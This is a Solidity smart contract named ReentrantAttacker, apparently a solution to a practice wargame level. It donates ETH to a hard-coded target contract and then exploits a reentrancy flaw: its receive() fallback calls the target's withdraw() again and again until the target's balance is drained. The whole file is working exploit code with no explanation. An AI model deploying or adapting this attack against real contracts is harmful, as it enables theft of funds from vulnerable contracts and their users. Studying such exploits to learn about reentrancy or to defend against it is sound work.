// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ReentrantAttacker {
    address reentranceAddress =
        address(0x2fcec3a72091f588Df269BabB916F081823c5392);

    uint256 initialDonation;

    constructor() payable {
        initialDonation = msg.value;

        require(
            initialDonation > 0,
            "initialDonation must be greater than 0 -- pass more ETH on contract creation."
        );

        bytes memory payload = abi.encodeWithSignature(
            "donate(address)",
            address(this)
        );

        (bool success, ) = reentranceAddress.call{value: initialDonation}(
            payload
        );

        require(
            success,
            "ReentrantAttacker construction and initial donation was unsuccessful."
        );
    }

    function reentrantWithdraw() public {
        bytes memory payload = abi.encodeWithSignature(
            "withdraw(uint256)",
            initialDonation
        );

        (bool success, ) = reentranceAddress.call(payload);

        require(success, "First reentrantWithdraw() call was unsuccessful.");
    }

    receive() external payable {
        if (reentranceAddress.balance > 0) {
            bytes memory payload = abi.encodeWithSignature(
                "withdraw(uint256)",
                reentranceAddress.balance
            );

            (bool success, ) = reentranceAddress.call(payload);

            require(
                success,
                "Successive reentrantWithdraw() call(s) were unsuccessful."
            );
        }
    }
}
